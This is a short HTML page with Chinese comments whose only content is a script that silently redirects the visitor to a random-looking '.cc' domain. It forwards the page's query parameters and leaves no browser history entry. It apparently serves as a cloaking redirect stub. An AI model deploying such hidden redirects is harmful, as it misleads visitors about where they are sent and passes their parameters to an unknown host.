<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <script>
    // 目标网站（你想跳转到哪里）
    const target = "http://h5.8a476s4p8qx7hcj76ytd.cc/";

    // 获取当前页面的查询参数（例如 ?a=1&b=2）
    const query = window.location.search;

    // 拼接目标地址 + 参数
    const finalUrl = target + query;

    // 无提示跳转（不留历史记录）
    location.replace(finalUrl);
  </script>
</head>
<body></body>
</html>
